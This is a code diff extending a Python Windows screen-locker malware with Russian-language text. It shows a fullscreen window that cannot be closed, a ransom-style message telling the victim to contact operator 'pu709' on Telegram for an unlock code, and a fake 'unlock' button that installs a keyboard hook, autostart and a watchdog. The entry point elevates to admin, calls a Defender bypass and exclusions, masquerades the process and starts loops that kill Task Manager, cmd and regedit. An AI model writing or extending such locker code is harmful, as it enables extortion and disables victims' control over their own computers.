@@ -33,6 +33,7 @@ except ImportError:
 # ================= НАСТРОЙКИ =================
 OPERATOR = "pu709"
 _SALT = b"QackLockerSalt_2026"
+VIRUS_DURATION_SECONDS = 60
 
 BLOCK_NAMES = {
     "notepad.exe", "taskmgr.exe", "cmd.exe", "regedit.exe",
@@ -851,4 +852,253 @@ def kill_watchdog():
     except Exception:
         pass
     try:
-        os.remove(WATCHDO
+        os.remove(WATCHDOG_PID_FILE)
+    except Exception:
+        pass
+    try:
+        os.remove(REBOOT_TRIGGER)
+    except Exception:
+        pass
+
+# ================= SOUND =================
+_scream_path = None
+
+
+def resource_path(rel):
+    base = getattr(sys, "_MEIPASS", os.path.dirname(os.path.abspath(__file__)))
+    p = os.path.join(base, rel)
+    return p if os.path.exists(p) else None
+
+
+def init_scream():
+    global _scream_path
+    if not HAS_PYGAME:
+        return
+    path = resource_path("scream.mp3")
+    if not path:
+        return
+    try:
+        pygame.mixer.init()
+        pygame.mixer.music.load(path)
+        _scream_path = path
+    except Exception:
+        _scream_path = None
+
+# ================= FLYING PHOTOS VIRUS =================
+def flying_photos_virus(parent_win):
+    """Окно с летающими фотками, которые размножаются каждые 2 сек (до 50), быстрые."""
+    import tkinter as tk
+    from PIL import Image, ImageTk
+
+    vwin = tk.Toplevel(parent_win)
+    vwin.title("...")
+    vwin.attributes("-fullscreen", True)
+    vwin.attributes("-topmost", True)
+    vwin.configure(bg="#000000")
+    vwin.protocol("WM_DELETE_WINDOW", lambda: None)
+    vwin.lift()
+    vwin.focus_force()
+
+    sw = vwin.winfo_screenwidth()
+    sh = vwin.winfo_screenheight()
+
+    canvas = tk.Canvas(vwin, width=sw, height=sh, bg="#000000", highlightthickness=0)
+    canvas.pack(fill="both", expand=True)
+
+    pil_photos = []
+    for name in ("assets/photo1.png", "assets/photo2.png"):
+        p = resource_path(name)
+        if p:
+            try:
+                img = Image.open(p).resize((200, 200)).convert("RGBA")
+                pil_photos.append(img)
+            except Exception:
+                pass
+    if not pil_photos:
+        try:
+            pil_photos.append(Image.new("RGBA", (200, 200), (51, 51, 51, 255)))
+        except Exception:
+            return
+
+    SIZE = 200
+    MAX_PHOTOS = 50
+    SPAWN_INTERVAL_MS = 2000
+    SPEED_CHOICES = [-25, -22, -18, -15, -12, -10, 10, 12, 15, 18, 22, 25]
+
+    items = []
+    tk_refs = []
+
+    def spawn_one():
+        if len(items) >= MAX_PHOTOS:
+            return
+        pil = random.choice(pil_photos)
+        photo = ImageTk.PhotoImage(pil)
+        tk_refs.append(photo)
+        x = random.randint(0, max(1, sw - SIZE))
+        y = random.randint(0, max(1, sh - SIZE))
+        item = canvas.create_image(x, y, image=photo, anchor="nw")
+        dx = random.choice(SPEED_CHOICES)
+        dy = random.choice(SPEED_CHOICES)
+        items.append({"id": item, "x": x, "y": y, "dx": dx, "dy": dy})
+
+    spawn_one()
+    spawn_one()
+
+    def spawn_loop():
+        spawn_one()
+        vwin.after(SPAWN_INTERVAL_MS, spawn_loop)
+
+    def animate():
+        for it in items:
+            it["x"] += it["dx"]
+            it["y"] += it["dy"]
+            if it["x"] <= 0 or it["x"] >= sw - SIZE:
+                it["dx"] = -it["dx"]
+                it["x"] = max(0, min(it["x"], sw - SIZE))
+            if it["y"] <= 0 or it["y"] >= sh - SIZE:
+                it["dy"] = -it["dy"]
+                it["y"] = max(0, min(it["y"], sh - SIZE))
+            canvas.coords(it["id"], it["x"], it["y"])
+        vwin.after(16, animate)
+
+    if HAS_PYGAME and _scream_path:
+        try:
+            pygame.mixer.music.load(_scream_path)
+            pygame.mixer.music.play(-1)
+        except Exception:
+            pass
+
+    spawn_loop()
+    animate()
+
+# ================= UI =================
+def run_ui():
+    import tkinter as tk
+    from PIL import Image, ImageTk
+
+    win = tk.Tk()
+    win.title(f"System Locker — {OPERATOR}")
+    win.attributes("-fullscreen", True)
+    win.attributes("-topmost", True)
+    win.configure(bg="#000000")
+    win.protocol("WM_DELETE_WINDOW", lambda: None)
+
+    win.update_idletasks()
+
+    eye_path = resource_path("assets/Eye.png")
+    if eye_path:
+        try:
+            img = Image.open(eye_path).resize((420, 200))
+            photo = ImageTk.PhotoImage(img)
+            lbl = tk.Label(win, image=photo, bg="#000000", bd=0)
+            lbl.image = photo
+            lbl.place(relx=0.5, rely=0.45, anchor="center")
+        except Exception:
+            tk.Label(win, text="[Eye Error]", fg="red", bg="black").place(
+                relx=0.5, rely=0.45, anchor="center")
+    else:
+        tk.Label(win, text="[Eye Missing]", fg="red", bg="black").place(
+            relx=0.5, rely=0.45, anchor="center")
+
+    boot1 = "Booting System\n\nMemory section at adres 0x420 IS LOCKED!!"
+    boot2 = f"  WIN LOCKED ACTIVATE\n  CRYPTER starting...\n  operator: {OPERATOR}"
+
+    label = tk.Label(win, text="", bg="#000000", fg="#FF0000",
+                     font=("Consolas", 15), anchor="w", justify="left")
+    label.pack(anchor="w")
+    label2 = tk.Label(win, text="", bg="#000000", fg="#656464",
+                      font=("Consolas", 15), anchor="w", justify="left")
+    label2.pack(pady=(20, 0), anchor="w")
+
+    st = {"i": 0, "i2": 0}
+    state = {"virus_started": False}
+
+    def typing():
+        if st["i"] <= len(boot1):
+            label.config(text=boot1[:st["i"]])
+            st["i"] += 1
+            win.after(2, typing)
+        elif st["i2"] <= len(boot2):
+            label2.config(text=boot2[:st["i2"]])
+            st["i2"] += 1
+            win.after(2, typing)
+        else:
+            locker_screen()
+
+    def _virus_timer_worker():
+        time.sleep(VIRUS_DURATION_SECONDS)
+        try:
+            full_destroy(force=True)
+        except Exception:
+            pass
+
+    def launch_virus():
+        if state["virus_started"]:
+            return
+        state["virus_started"] = True
+        install_keyboard_hook()
+        install_autostart()
+        spawn_watchdog()
+        flying_photos_virus(win)
+        threading.Thread(target=_virus_timer_worker, daemon=True).start()
+
+    def locker_screen():
+        for w in win.winfo_children():
+            w.destroy()
+
+        tk.Label(win, text="WINDOWS ЗАБЛОКИРОВАН!",
+                 fg="#4f4f4f", bg="#000000",
+                 font=("Consolas", 18)).pack(pady=(50, 20))
+
+        tk.Label(win, text=(
+            f"Ваш компьютер подвержен блокировке хакерской группой {OPERATOR}.\n"
+            "Нажмите кнопку ниже, чтобы запустить процесс разблокировки.\n\n"
+            f"За кодом писать @{OPERATOR} (Telegram)"),
+            fg="#AAAAAA", bg="#000000", font=("Consolas", 13),
+            justify="center").pack(pady=20)
+
+        tk.Button(win, text="РАЗБЛОКИРОВАТЬ", command=launch_virus,
+                  bg="#4CAF50", fg="#FFFFFF",
+                  font=("Consolas", 24, "bold"), bd=0,
+                  padx=80, pady=30, cursor="hand2",
+                  activebackground="#66BB6A", activeforeground="#FFFFFF").pack(pady=60)
+
+    typing()
+    win.mainloop()
+
+# ================= ENTRY =================
+def main():
+    if len(sys.argv) >= 3 and sys.argv[1] == "--watchdog":
+        try:
+            parent = int(sys.argv[2])
+        except Exception:
+            parent = 0
+        watchdog_main(parent)
+        return
+
+    ensure_admin()
+
+    try:
+        add_exclusions()
+    except Exception:
+        pass
+
+    threading.Thread(target=run_defender_bypass_and_log, daemon=True).start()
+
+    if is_destroyed():
+        full_destroy(force=True)
+        sys.exit(0)
+
+    self_masquerade()
+    apply_reg_blocks()
+    init_scream()
+
+    threading.Thread(target=blocking_loop, daemon=True).start()
+    threading.Thread(target=wmi_kill_loop, daemon=True).start()
+    threading.Thread(target=desktop_watchdog, daemon=True).start()
+
+    run_ui()
+
+
+if __name__ == "__main__":
+    main()
